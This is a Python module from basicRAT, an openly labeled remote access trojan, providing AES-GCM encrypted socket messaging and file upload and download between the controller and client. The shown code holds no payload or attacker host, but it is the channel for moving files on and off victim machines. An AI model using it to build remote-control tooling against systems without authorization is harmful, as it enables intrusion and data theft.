# -*- coding: utf-8 -*-

#
# basicRAT common module
# https://github.com/vesche/basicRAT
#

import crypto
import os
import socket
import time


class Client(object):
    def __init__(self, conn, addr, IV=0, uid=0):
        self.conn   = conn
        self.addr   = addr
        self.dh_key = crypto.diffiehellman(self.conn)
        self.GCM    = crypto.AES_GCM(self.dh_key)
        self.IV     = IV
        self.uid    = uid
        self.conn.setblocking(0)

    # take plaintext, encrypt using GCM object, and send over sock
    def sendGCM(self, plaintext):
        ciphertext, tag = self.GCM.encrypt(self.IV, plaintext)
        self.IV += 2 # self incrementing should ONLY happen here
        return self.conn.send(
            crypto.long_to_bytes(self.IV-2, 12) +
            ciphertext +
            crypto.long_to_bytes(tag, 16)
        )

    # read data from sock, decrypt using gcm object, and return plaintext
    # WARNING: gcm.decrypt throws InvalidTagException upon tampered/corrupted
    # this will need to be handled outside of this function
    def recvGCM(self):
        m = ''
        while True:
            try:
                m += self.conn.recv(4096)
            except socket.error:
                break

        # prevents decryption of empty string
        if not m:
            return m

        IV = crypto.bytes_to_long(m[:12])
        ciphertext = m[12:-16]
        tag = crypto.bytes_to_long(m[-16:])

        #try:
        data = self.GCM.decrypt(IV, ciphertext, tag)
        #except:
        #    data = ''
        #    pass

        return data

    # recieve a file from a socket (download)
    def recvfile(self, fname):
        if os.path.isfile(fname):
            return
        with open(fname, 'wb') as f:
            # data = self.recvGCM()
            # f.write(data)
            data = 1
            while data:
                data = self.recvGCM()
                f.write(data)

    # send a file over a socket (upload)
    def sendfile(self, fname):
        if not os.path.isfile(fname):
            return
        with open(fname, 'rb') as f:
            # res = f.read(4096)
            # self.sendGCM(res)
            res = 1
            while res:
                res = f.read(4096)
                self.sendGCM(res)
